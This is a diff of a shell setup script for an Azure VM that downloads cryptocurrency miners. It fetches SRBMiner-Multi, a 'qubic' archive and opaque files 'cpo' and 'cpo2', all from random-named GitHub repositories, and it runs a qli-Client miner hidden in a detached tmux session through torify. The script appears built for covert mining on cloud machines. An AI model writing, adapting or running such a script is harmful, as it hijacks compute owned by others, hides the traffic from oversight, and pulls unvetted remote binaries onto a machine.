@@ -20,6 +20,9 @@ wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner
 tar -xf SRBMiner-Multi-2-4-7-Linux.tar.xz
 sudo rm -r SRBMiner-Multi-2-4-7-Linux.tar.xz
 mv /home/azureuser/SRBMiner-Multi-2-4-7/* /home/azureuser
+#### QUBIC \ QLI-CLIENT\ tmux new -ds servak torify ./qli-Client
+wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/qubic.tar.gz -P /home/azureuser
+tar -xf qubic.tar.gz
 #####################################################################################################################
 wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo -P /home/azureuser
 wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo2 -P /home/azureuser
